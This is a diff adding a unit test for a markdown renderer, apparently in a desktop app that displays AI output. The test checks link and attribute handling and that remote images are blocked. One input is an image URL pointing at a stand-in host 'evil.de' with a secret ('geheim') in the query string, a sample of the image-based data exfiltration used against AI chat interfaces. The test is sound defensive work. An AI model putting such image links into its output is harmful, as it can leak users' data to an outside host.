@@ -76,3 +76,15 @@ test('iCalendar: Import, Export und Rundreise', () => {
   const again = parseIcs(toIcs(ev));
   assert.deepEqual(again.map((e) => [e.title, e.date, e.time]), ev.map((e) => [e.title, e.date, e.time]));
 });
+
+test('Markdown: Auto-Links schreiben nicht in Attribute, KI-Bilder nur als Link', async () => {
+  const { renderMarkdown } = await import('../src/renderer/js/core/markdown.js');
+  const a = renderMarkdown('![siehe https://x.de/a](https://bild.de/b.png)');
+  assert.equal(a, '<p><img alt="siehe https://x.de/a" src="https://bild.de/b.png"></p>');
+  const b = renderMarkdown('[a](https://x.de/(https://y.de/z) **f** `c https://q.de`');
+  assert.ok(!/href="[^"]*<a/.test(b), b);
+  assert.ok(b.includes('<strong>f</strong>') && b.includes('<code>c https://q.de</code>'), b);
+  const c = renderMarkdown('![x](https://evil.de/?d=geheim)', { remoteImages: false });
+  assert.ok(!c.includes('<img') && c.includes('data-ext="1"'), c);
+  assert.equal(renderMarkdown('[`code`](https://a.de)'), '<p><a href="https://a.de" data-ext="1"><code>code</code></a></p>');
+});
